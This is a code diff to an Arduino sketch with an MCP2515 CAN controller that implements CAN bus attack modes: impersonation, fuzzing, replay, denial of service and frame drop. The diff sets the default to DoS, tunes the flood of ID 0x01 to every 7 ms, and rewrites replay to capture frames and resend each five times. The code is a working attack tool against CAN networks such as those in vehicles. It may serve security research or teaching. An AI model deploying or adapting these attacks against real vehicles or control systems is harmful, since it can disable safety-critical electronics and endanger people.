@@ -21,13 +21,13 @@ mcp2515_can CAN(SPI_CS_PIN);
 unsigned long timeStart;
 // The CAN ID to filter for (If equal to 0 it will be ignored)
 unsigned long filterId = 0;
-// The delay between sending messages
-int delaySize = 0;
+// The delay between sending messages. Values below 9 seem to cause issues.
+int delaySize = 1000;
 
 // The different operations that can be performed
 enum Operation {Impersonation, Fuzzing, Replay, DoS, FrameDrop};
 // Change op to set the operation mode
-Operation op = Impersonation;
+Operation op = DoS;
 
 
 // ARDUINO FUNCTIONS ==========================================================
@@ -84,8 +84,6 @@ void impersonation() {
     byte impRTR = 0;
     // The length of the message in bytes (Set to 1)
     byte impLen = 1;
-    // The return value of sending the message
-    int report;
 
     while(true) {
         // Sends the CAN message
@@ -108,28 +106,30 @@ void fuzzing() {
 }
 
 void replay() {
-    // The variables of which the CAN message will be stored
-    byte status = 0;
-    unsigned long id;
-    byte ext;
-    byte rtr;
+    // The number of times to repeat the message
+    int numRepeat = 5;
+    unsigned long id = 0;
+    byte ext = 0;
+    byte rtr = 0;
     unsigned char len = 0;
     unsigned char buf[MAX_DATA_SIZE];
-    // The return value of sending the message
-    int report;
-
-    do {
-        // Read the CAN message
-        CAN.readMsgBufID(status, &id, &ext, &rtr, &len, buf);
-    } while (filterId != id || filterId != 0);
 
     while (true) {
-        // Sends the CAN message
-        send_can(id, ext, rtr, len, buf);
+        do {
+            // The variables of which the CAN message will be stored
+            byte status = CAN.readRxTxStatus();
+            // Read the CAN message
+            CAN.readMsgBufID(status, &id, &ext, &rtr, &len, buf);
+        } while (filterId == id || id == 0);
 
-        // Delay if needed
-        if (delaySize) {
-            delay(delaySize);
+        // Sends the CAN message a number of times (determined by numRepeat)
+        for (int i = 0; i < numRepeat; i++) {
+            send_can(id, ext, rtr, len, buf);
+
+            // Delay between message capture if needed
+            if (delaySize) {
+                delay(delaySize);
+            }
         }
     }
 }
@@ -137,10 +137,8 @@ void replay() {
 void dos() {
     // Sends a CAN message with the CAN id of 0x01 repeatedly
     send_can(0x01, false, true);
-    // Delay if needed
-    if (delaySize) {
-        delay(delaySize);
-    }
+
+    delay(7);
 }
 
 void frameDrop() {
